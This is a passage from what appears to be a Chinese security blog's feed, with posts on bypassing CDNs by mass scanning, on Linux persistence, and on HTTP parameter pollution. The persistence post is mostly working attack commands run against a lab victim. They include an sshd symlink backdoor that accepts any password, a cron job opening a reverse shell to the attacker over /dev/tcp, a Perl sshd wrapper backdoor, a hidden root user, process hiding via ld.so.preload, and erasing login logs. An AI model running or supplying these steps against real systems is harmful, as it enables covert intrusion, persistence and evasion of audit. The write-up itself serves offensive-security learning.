class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">sys.path.append(&apos;/Users/michael/my_py_scripts&apos;)</span><br></pre></td></tr></table></figure><p>&#8195;这种方法是在运行时修改，运行结束后失效。</p><p>&#8195;第二种方法是设置环境变量<code>PYTHONPATH</code>,该环境变量的内容会被自动添加到模块搜索路径中，设置方式与设置path环境变量类似。注意只需添加自己的搜索路径，python自己本身的搜索路径不受影响。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.liaoxuefeng.com" target="_blank" rel="noopener">https://www.liaoxuefeng.com</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绕过CDN获取真实ip</title>
      <link href="/2019/12/25/%E8%8E%B7%E5%8F%96CDN%E8%83%8C%E5%90%8E%E7%BD%91%E7%AB%99%E7%9A%84%E7%9C%9F%E5%AE%9Eip/"/>
      <url>/2019/12/25/%E8%8E%B7%E5%8F%96CDN%E8%83%8C%E5%90%8E%E7%BD%91%E7%AB%99%E7%9A%84%E7%9C%9F%E5%AE%9Eip/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="550" height="86" src="//music.163.com/outchain/player?type=2&id=1387600124&auto=0&height=66"></iframe><h2 id="获取ip"><a href="#获取ip" class="headerlink" title="获取ip"></a>获取ip</h2><p>首先我们从apnic获取亚洲区域分配的ip</p><p><code>wget ftp://ftp.apnic.net/public/apnic/stats/apnic/delegated-apnic-latest</code></p><p>然后筛查出我们需要的国家</p><p><code>cat delegated-apnic-latest |grep -e &#39;CN|ipv4&#39; -e &#39;AU|ipv4&#39; -e &#39;BR|ipv4&#39; -e &#39;CA|ipv4&#39; -e &#39;CH|ipv4&#39; -e &#39;CO|ipv4&#39; -e &#39;DE|ipv4&#39; -e &#39;ES|ipv4&#39; -e &#39;FR|ipv4&#39; -e &#39;GB|ipv4&#39; -e &#39;HK|ipv4&#39; -e &#39;ID|ipv4&#39; -e &#39;IN|ipv4&#39; -e &#39;JP|ipv4&#39; -e &#39;KH|ipv4&#39; -e &#39;KR|ipv4&#39; -e &#39;LA|ipv4&#39; -e &#39;MM|ipv4&#39; -e &#39;MN|ipv4&#39; -e &#39;MO|ipv4&#39; -e &#39;MV|ipv4&#39; -e &#39;MY|ipv4&#39; -e &#39;NL|ipv4&#39; -e &#39;NZ|ipv4&#39; -e &#39;PH|ipv4&#39; -e &#39;PK|ipv4&#39; -e &#39;SE|ipv4&#39; -e &#39;SG|ipv4&#39; -e &#39;TH|ipv4&#39; -e &#39;TR|ipv4&#39; -e &#39;TW|ipv4&#39; -e &#39;US|ipv4&#39; -e &#39;VN|ipv4&#39; -e &#39;ZA|ipv4&#39; &gt;&gt; ip.txt</code></p><p>然后我们看到的是下面这样</p><p><img src="/images/IP.png" alt="IP"></p><p>可以看到是以“|”作为分隔，第四个字段为ip的起始地址，第五字段为ip的地址数量，我使用了一种比较笨的方法来获取这个ip段的子网掩码。</p><p>首先我是使用一下命令来查看ip的地址数量</p><p><code>cat ip.txt |cut -d &#39;|&#39; -f5|sort -u</code></p><p><img src="/images/IP1.png" alt="IP1"></p><p>然后我通过一个网站<code>http://www.ab126.com/goju/1840.html</code>计算出了子网掩码，这种方法的确是笨了点，但是上网搜了半天也没有找到方便快捷的解决方案</p><p><img src="/images/IP2.png" alt="IP2"></p><p>最后我们执行以下命令替换一下</p><p><code>cat ip.txt |cut -d &#39;|&#39; -f4,5|sed &#39;s/1024/22/;s/1048576/12/;s/131072/15/;s/16384/18/;s/16777216/8/;s/2048/21/;s/2097152/10/;s/256/24/;s/262144/14/;s/32768/17/;s/4096/20/;s/4194304/10/;s/512/23/;s/524288/13/;s/65536/16/;s/8192/19/;s/8388608/9/;s/|/\//&#39; &gt;&gt;ip1.txt</code></p><p><img src="/images/IP3.png" alt="IP3"></p><p>没想到搞出这个来竟然比挖到洞有成就感！！</p><p>我们还需要在这个<code>ip1.txt</code>文件中去除cdn的ip</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line">123.6.13.0/24</span><br><span class="line">202.102.85.0/24</span><br><span class="line">61.160.224.0/24</span><br><span class="line">182.140.227.0/24</span><br><span class="line">221.204.14.0/24</span><br><span class="line">222.73.144.0/24</span><br><span class="line">61.240.144.0/24</span><br><span class="line">36.27.212.0/24</span><br><span class="line">125.88.189.0/24</span><br><span class="line">120.52.18.0/24</span><br><span class="line">119.84.15.0/24</span><br><span class="line">180.163.224.0/24</span><br><span class="line">103.21.244.0/22</span><br><span class="line">103.22.200.0/22</span><br><span class="line">103.31.4.0/22</span><br><span class="line">104.16.0.0/12</span><br><span class="line">108.162.192.0/18</span><br><span class="line">131.0.72.0/22</span><br><span class="line">141.101.64.0/18</span><br><span class="line">162.158.0.0/15</span><br><span class="line">172.64.0.0/13</span><br><span class="line">173.245.48.0/20</span><br><span class="line">188.114.96.0/20</span><br><span class="line">190.93.240.0/20</span><br><span class="line">197.234.240.0/22</span><br><span class="line">198.41.128.0/17</span><br><span class="line">111.32.135.0/24 </span><br><span class="line">111.32.136.0/24      </span><br><span class="line">125.39.174.0/24       </span><br><span class="line">125.39.239.0/24</span><br><span class="line">112.65.73.0/24</span><br><span class="line">112.65.74.0/24  </span><br><span class="line">112.65.75.0/24       </span><br><span class="line">119.84.92.0/24    </span><br><span class="line">119.84.93.0/24     </span><br><span class="line">113.207.100.0/24    </span><br><span class="line">113.207.101.0/24      </span><br><span class="line">113.207.102.0/24</span><br><span class="line">180.163.188.0/24   </span><br><span class="line">180.163.189.0/24   </span><br><span class="line">163.53.89.0/24    </span><br><span class="line">101.227.206.0/24   </span><br><span class="line">101.227.207.0/24  </span><br><span class="line">180.163.113.0/24</span><br><span class="line">119.188.97.0/24        </span><br><span class="line">119.188.9.0/24      </span><br><span class="line">61.155.149.0/24        </span><br><span class="line">61.156.149.0/24        </span><br><span class="line">61.155.165.0/24        </span><br><span class="line">61.182.137.0/24        </span><br><span class="line">61.182.136.0/24        </span><br><span class="line">120.52.29.0/24        </span><br><span class="line">120.52.113.0/24  </span><br><span class="line">222.216.190.0/24       </span><br><span class="line">219.159.84.0/24                        </span><br><span class="line">183.60.235.0/24        </span><br><span class="line">116.31.126.0/24       </span><br><span class="line">116.31.127.0/24          </span><br><span class="line">117.34.13.0/24        </span><br><span class="line">117.34.14.0/24                        </span><br><span class="line">42.236.93.0/24        </span><br><span class="line">42.236.94.0/24                      </span><br><span class="line">119.167.246.0/24        </span><br><span class="line">150.138.149.0/24        </span><br><span class="line">150.138.150.0/24        </span><br><span class="line">150.138.151.0/24    </span><br><span class="line">117.27.149.0/24                                </span><br><span class="line">59.51.81.0/24       </span><br><span class="line">220.170.185.0/24        </span><br><span class="line">220.170.186.0/24   </span><br><span class="line">183.61.236.0/24        </span><br><span class="line">14.17.71.0/24      </span><br><span class="line">119.147.134.0/24   </span><br><span class="line">124.95.168.0/24        </span><br><span class="line">124.95.188.0/24       </span><br><span class="line">61.54.46.0/24       </span><br><span class="line">61.54.47.0/24          </span><br><span class="line">101.71.55.0/24        </span><br><span class="line">101.71.56.0/24        </span><br><span class="line">183.232.51.0/24        </span><br><span class="line">183.232.53.0/24        </span><br><span class="line">157.255.25.0/24        </span><br><span class="line">157.255.26.0/24                </span><br><span class="line">112.25.90.0/24        </span><br><span class="line">112.25.91.0/24        </span><br><span class="line">58.211.2.0/24        </span><br><span class="line">58.211.137.0/24        </span><br><span class="line">122.190.2.0/24        </span><br><span class="line">122.190.3.0/24               </span><br><span class="line">183.61.177.0/24        </span><br><span class="line">183.61.190.0/24        </span><br><span class="line">117.148.160.0/24        </span><br><span class="line">117.148.161.0/24        </span><br><span class="line">115.231.186.0/24        </span><br><span class="line">115.231.187.0/24</span><br><span class="line">58.250.143.0/24</span><br><span class="line">58.251.121.0/24</span><br><span class="line">59.36.120.0/24</span><br><span class="line">61.151.163.0/24</span><br><span class="line">101.227.163.0/24</span><br><span class="line">111.161.109.0/24</span><br><span class="line">116.128.128.0/24</span><br><span class="line">123.151.76.0/24</span><br><span class="line">125.39.46.0/24</span><br><span class="line">140.207.120.0/24</span><br><span class="line">180.163.22.0/24</span><br><span class="line">183.3.254.0/24</span><br><span class="line">223.166.151.0/24</span><br><span class="line">113.107.238.0/24</span><br><span class="line">106.42.25.0/24</span><br><span class="line">183.222.96.0/24</span><br><span class="line">117.21.219.0/24</span><br><span class="line">116.55.250.0/24</span><br><span class="line">111.202.98.0/24</span><br><span class="line">111.13.147.0/24</span><br><span class="line">122.228.238.0/24</span><br><span class="line">58.58.81.0/24</span><br><span class="line">1.31.128.0/24</span><br><span class="line">123.155.158.0/24</span><br><span class="line">106.119.182.0/24</span><br><span class="line">180.97.158.0/24</span><br><span class="line">113.207.76.0/24</span><br><span class="line">117.23.61.0/24</span><br><span class="line">118.212.233.0/24</span><br><span class="line">111.47.226.0/24</span><br><span class="line">219.153.73.0/24</span><br><span class="line">113.200.91.0/24</span><br><span class="line">1.32.240.0/24</span><br><span class="line">203.90.247.0/24</span><br><span class="line">183.110.242.0/24</span><br><span class="line">202.162.109.0/24</span><br><span class="line">182.23.211.0/24</span><br><span class="line">1.32.242.0/24</span><br><span class="line">1.32.241.0/24</span><br><span class="line">202.162.108.0/24</span><br><span class="line">185.254.242.0/24</span><br><span class="line">109.94.168.0/24</span><br><span class="line">109.94.169.0/24</span><br><span class="line">1.32.243.0/24</span><br><span class="line">61.120.154.0/24</span><br><span class="line">1.255.41.0/24</span><br><span class="line">112.90.216.0/24</span><br><span class="line">61.213.176.0/24</span><br><span class="line">1.32.238.0/24</span><br><span class="line">1.32.239.0/24</span><br><span class="line">1.32.244.0/24</span><br></pre></td></tr></table></figure><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>这里我使用的zmap对全部ip的80,443,8080端口进行了扫描，虽然不能多端口同时扫描但是他真的很快啊，昨天我用的masscan扫了一晚上，愣是没扫完(或许是服务器的一些原因)</p><p><code>zmap -w ip1.txt -p 80 -o 80.txt</code></p><p><code>zmap -w ip1.txt -p 8080 -o 8080.txt</code></p><p><code>zmap -w ip1.txt -p 443 -o 443.txt</code></p><h2 id="获取banner"><a href="#获取banner" class="headerlink" title="获取banner"></a>获取banner</h2><p>这里我们需要安装<code>Zgrab</code></p><p>先安装go：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://storage.googleapis.com/golang/go1.8.1.linux-amd64.tar.gz</span><br><span class="line">tar -C /usr/local -xzf go1.8.1.linux-amd64.tar.gz</span><br><span class="line">export PATH=$PATH:/usr/local/go/bin</span><br><span class="line">export GOPATH=/usr/local/go/bin/</span><br></pre></td></tr></table></figure><p>再安装Zgrab:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">go get github.com/zmap/zgrab</span><br><span class="line">cd $GOPATH/src/github.com/zmap/zgrab</span><br><span class="line">go build</span><br></pre></td></tr></table></figure><p>假设你的目标网站<code>www.abc.com</code>存在CND</p><p>先进到zgrab目录下</p><p><code>cd $goPath/src/gihub.com/zmap/zgradb</code></p><p>修改文件<code>http-req</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim http-req</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: www.abc.com</span><br><span class="line">(这里要空行)</span><br></pre></td></tr></table></figure><p>然后开扫</p><p><code>cat 80.txt | ./zgrab --port 80 -http-user-agent=&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36&quot; -timeout=30 -senders=2000 -data=&quot;./http-req&quot; --output-file=80b.txt</code></p><p><code>cat 443.txt | ./zgrab --port 443 --tls -http-user-agent=&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36&quot; -timeout=30 -senders=2000 -data=&quot;./http-req&quot; --output-file=443b.txt</code></p><p>扫完以后，我们在目标网页查看源代码，找一些只有这个网站才会有的关键词</p><p><code>cat 80b.txt | grep &#39;关键词&#39; &gt;&gt;abc.com.txt</code></p><p>这样基本上就能出来</p><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>在<code>http://www.oldman19.top/2019/12/08/如何做信息收集/</code>这篇文章里我也有写绕cdn的一些方法，用内些方法比较快，这篇文章的方法比较费时间，用便宜的服务器扫一个80端口就得3.5小时。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://bobao.360.cn/learning/detail/211.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/211.html</a></p>]]></content>
      
      
      <categories>
          
          <category> recon </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recon </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux权限维持</title>
      <link href="/2019/12/18/linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
      <url>/2019/12/18/linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="550" height="86" src="//music.163.com/outchain/player?type=2&id=431259415&auto=0&height=66"></iframe><p>attack：192.168.71.14</p><p>victim：192.168.71.13</p><h2 id="SSHD软连接"><a href="#SSHD软连接" class="headerlink" title="SSHD软连接"></a>SSHD软连接</h2><p>&#8195;首先在victim执行以下命令</p><p><code>ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=5555</code></p><p>&#8195;然后再attack上连接victim，任意密码皆可登陆</p><p><code>ssh root@192.168.71.13 -p 5555</code></p><h2 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h2><p>&#8195;首先我们在victim上的<code>/etc</code>下创建一个名为<code>...</code>的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">if netstat -ano|grep -v grep | grep &quot;192.168.71.14&quot;&gt;/dev/null</span><br><span class="line">then</span><br><span class="line">echo &quot;ok&quot;&gt;/dev/null</span><br><span class="line">else</span><br><span class="line">/sbin/iptables --policy INPUT ACCEPT</span><br><span class="line">/sbin/iptables --policy OUTPUT ACCEPT</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.71.14/53 0&gt;&amp;1</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>&#8195;接着执行命令<code>chmod +sx /etc/...</code>，然后修改/etc/crontab这个文件，在末行加入如下一行，代表每小时的10分执行一次</p><p><img src="/images/crontab.png" alt="crontab"></p><p>&#8195;最后我们只需要在attack上使用nc监听就好了，<code>nc -vv -lp 53</code></p><h2 id="添加UID为0的用户"><a href="#添加UID为0的用户" class="headerlink" title="添加UID为0的用户"></a>添加UID为0的用户</h2><p>&#8195;因为uid为0就是root权限，所以可以这样快速的添加一个root权限用户</p><p><code>useradd -o -u 0 guest</code></p><h2 id="SSH-wrapper后门"><a href="#SSH-wrapper后门" class="headerlink" title="SSH wrapper后门"></a>SSH wrapper后门</h2><p>&#8195;首先在victim上依次执行一下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/sbin/</span><br><span class="line">mv sshd ../bin/</span><br><span class="line">echo &apos;#!/usr/bin/perl&apos; &gt;sshd</span><br><span class="line">echo &apos;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&apos; &gt;&gt;sshd</span><br><span class="line">echo &apos;exec&#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&apos; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">/etc/init.d/sshd restart</span><br></pre></td></tr></table></figure><p>&#8195;然后再attack上去连接目标机<code>socat STDIO TCP4:192.168.71.13:22,sourceport=13377</code></p><h2 id="ICMP-shell"><a href="#ICMP-shell" class="headerlink" title="ICMP shell"></a>ICMP shell</h2><p>&#8195;首先我选择在attack上下载并安装工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://nchc.dl.sourceforge.net/project/icmpshell/ish/v0.2/ish-v0.2.tar.gz</span><br><span class="line">tar zxvf ish-v0.2.tar.gz</span><br><span class="line">cd ISHELL-v0.2/</span><br><span class="line">make linux</span><br></pre></td></tr></table></figure><p>&#8195;然后在刚才安装的内个目录下执行命令<code>python -m SimpleHTTPServer 8000</code></p><p>&#8195;接着去victim上执行wget命令<code>wget http://192.168.71.14:8000/ishd</code>下载<code>ishd</code>这个文件，然后</p><p>&#8195;victim：<code>./ishd -i 4455 -t 0 -p 1024</code></p><p>&#8195;attack：<code>./ish -i 4455 -t 0 -p 1024 192.168.71.13</code></p><p><img src="/images/icmpshell.png" alt="icmpshell"></p><h2 id="隐身登录"><a href="#隐身登录" class="headerlink" title="隐身登录"></a>隐身登录</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh -T username@host /bin/bash -i</span><br><span class="line"></span><br><span class="line">ssh -o UserKnownHostsFile=/dev/null -T user@host </span><br><span class="line">/bin/bash -if</span><br></pre></td></tr></table></figure><h2 id="Rootkit"><a href="#Rootkit" class="headerlink" title="Rootkit"></a>Rootkit</h2><p>&#8195;研究了几日没研究明白，所以只能放个链接，里面收集了一些rootkit,常用的有：<code>t0rn /mafix/enyelkm</code></p><p><code>https://github.com/d30sa1/RootKits-List-Download</code></p><h2 id="隐藏技术"><a href="#隐藏技术" class="headerlink" title="隐藏技术"></a>隐藏技术</h2><p>1.隐藏历史操作命令</p><p>&#8195;首先我们使用命令<code>history</code>查看历史操作发现目前一共有1257条历史操作</p><p><img src="/images/history.png" alt="history"></p><p>&#8195;现在我们输入命令<code>[空格]set +o history</code>这条命令前一定要空格，这样这条命令就不会记录到历史中，在我们搞完事儿之后可以重新开启历史功能<code>[空格]set -o history</code></p><p>&#8195;再者如果一些命令不小心记录在<code>history</code>里，我们可以通过命令删除<code>history -d [数字]</code></p><p>2.进程隐藏</p><p>&#8195;下载工具<code>libprocesshider</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/gianlucaborello/libprocesshider.git</span><br><span class="line">cd libprocesshider/ &amp;&amp; make</span><br><span class="line">cp libprocesshider.so /usr/local/lib/</span><br><span class="line">echo /usr/local/lib/libprocesshider.so &gt;&gt; /etc/ld.so.preload</span><br></pre></td></tr></table></figure><p>&#8195;执行完这几条命令后，方可隐藏后续运行的程序。</p><p>3.登录日志清除</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &gt; /var/log/wtmp  //成功登录的用户日志</span><br><span class="line">echo &gt; /var/log/btmp  //尝试登陆的用户日志</span><br><span class="line">echo &gt; /var/log/lastlog //最近登录信息</span><br></pre></td></tr></table></figure><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>&#8195;本文写的只是一部分，其余的以后有时间再写，下面参考链接稍微全一些。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.anquanke.com/post/id/171891#h3-8" target="_blank" rel="noopener">https://www.anquanke.com/post/id/171891#h3-8</a></p><p><a href="https://www.secpulse.com/archives/100484.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/100484.html</a></p><p><a href="https://cloud.tencent.com/developer/article/1498976" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1498976</a></p><p><a href="http://www.91ri.org/124.html" target="_blank" rel="noopener">http://www.91ri.org/124.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP参数污染</title>
      <link href="/2019/12/14/HTTP%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93/"/>
      <url>/2019/12/14/HTTP%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="550" height="86" src="//music.163.com/outchain/player?type=2&id=1341612412&auto=0&height=66"></iframe><h2 id="HTTP参数污染"><a href="#HTTP参数污染" class="headerlink" title="HTTP参数污染"></a>HTTP参数污染</h2><p>&#8195;HTTP参数污染也叫HPP（HTTP Parameter Pollution），原理很简单就是同名称的参数出现多次，不同的服务器处理的方式不一样，有的会取第一个参数，有的会取第二个参数，还有的两个参数都取，就比如url为:<code>http://example.com/?color=red&amp;color=blue</code>服务器具体认第一个还是第二个可以对照下图。</p><p><img src="/images/HPP1.png" alt="HPP1"></p><h2 id="攻击客户端"><a href="#攻击客户端" class="headerlink" title="攻击客户端"></a>攻击客户端</h2><p>&#8195;这里用到<code>bwapp</code>这个靶场,当用户登录后，可以给喜欢的电影投票</p><p><img src="/images/HPP2.png" alt="HPP1"></p><p>&#8195;我现在给第一个电影投票，点击<code>Vote</code>后，发现url中有个<code>movie=1</code>参数</p><p><img src="/images/HPP3.png" alt="HPP1"></p><p>&#8195;尝试HPP攻击，发现的确存在这个漏洞，而且是采用第二个参数</p><p><img src="/images/HPP4.png" alt="HPP1"></p><p>&#8195;现在我们把用户名改为syx&amp;movie=1</p><p><img src="/images/HPP5.png" alt="HPP1"></p><p>&#8195;这样的话给任何电影投票，都是投给第一个电影，当然了，这个例子不太好，后面我会找真实案例分享给大家。</p><h2 id="攻击服务器端"><a href="#攻击服务器端" class="headerlink" title="攻击服务器端"></a>攻击服务器端</h2><p>&#8195;服务器会根据我们发送过去的数据来执行一些功能，例如：</p><p><code>https://xxx.bitcoin.com/transfer?from=1337&amp;to=8008&amp;amount=1000</code></p><p>&#8195;在此url中，有三个参数会传到服务器，这样1000个比特币就能从一个账户转到另一个账户，我们只需添加一个额外的from参数，就会从别人的账户转1000比特币到8008账户</p><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>1.社交共享按钮中的参数污染</p><p>&#8195;这个漏洞就是在我们分享一个文章到一些社交平台的时候发送的并不是自己想要分享的文章</p><p>&#8195;就比如url:<code>https://xxx.com/blog/test</code></p><p>&#8195;我们把它修改为<code>https://xxx.com/blog/test?&amp;u=https://vk.com</code></p><p>&#8195;当有人访问了这个链接并点击了分享，</p><p>&#8195;这个链接就会变成<code>https://facebook.com/sharer.php?u=https://xxx.com/blog/test?&amp;u=https://vk.com</code>因为存在hpp，而且服务器端会选择第二个参数，就把内个恶意链接分享到facebook了。</p><p>2.Twitter取消订阅提醒</p><p>&#8195;当在取消接收Twitter的提醒时，url：<code>https://twitter.com/i/u?t=1&amp;cn=bWV&amp;sig=657&amp;iid=F6542&amp;uid=1134885524&amp;nid=22+26</code></p><p>&#8195;这里有个<code>uid</code>这个参数,是我们账户的<code>uid</code>，当我们把它修改为其他<code>uid</code>的时候，twitter返回错误，然后尝试<code>HPP</code>，添加第二个<code>uid</code>参数,url：<code>https://twitter.com/i/u?iid=F6542&amp;uid=2321301342&amp;uid=1134885524&amp;nid=22+26</code>然后就成功的取消订阅了其他用户的邮件提醒</p><p>3.HPP到账户接管</p><p>&#8195;在网站的重置密码处，在提交邮箱时，会生成重置密码的连接，链接的值为内个邮箱，同时还会发送邮件到内个有邮箱，我们利用HPP，提交多个电子邮箱，发现服务器会采用第一个邮箱的值生成密码重置链接，然后把重置链接发送到了第二个邮箱，我们就可以打开邮箱重置其他用户的密码了，因为一些原因这里没有配图，原文链接是：<code>https://medium.com/@logicbomb_1/bugbounty-compromising-user-account-how-i-was-able-to-compromise-user-account-via-http-4288068b901f</code></p><h2 id="如何预防HPP？"><a href="#如何预防HPP？" class="headerlink" title="如何预防HPP？"></a>如何预防HPP？</h2><ul><li>在将用户输入嵌入到URL中之前，请确保用户输入已被URL编码</li><li>必须使用严格的正则表达式</li><li>您应该了解后端如何处理一个参数的多次出现</li></ul><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>&#8195;HPP这种漏洞最近案例很少，非常少，多数都是利用这种漏洞来bypass waf</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><code>https://press.one/files/46204c0082089a540cefffd6f834da2139bb7ff3e01a73f12218219458b5b4ce</code></p><p><code>https://www.cnblogs.com/backlion/p/8556150.html</code></p>]]></content>
      
      
      <categories>
          
          <category> HTTP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP请求走私</title>
      <link href="/2019/12/12/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"/>
      <url>/2019/12/12/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</url>
      
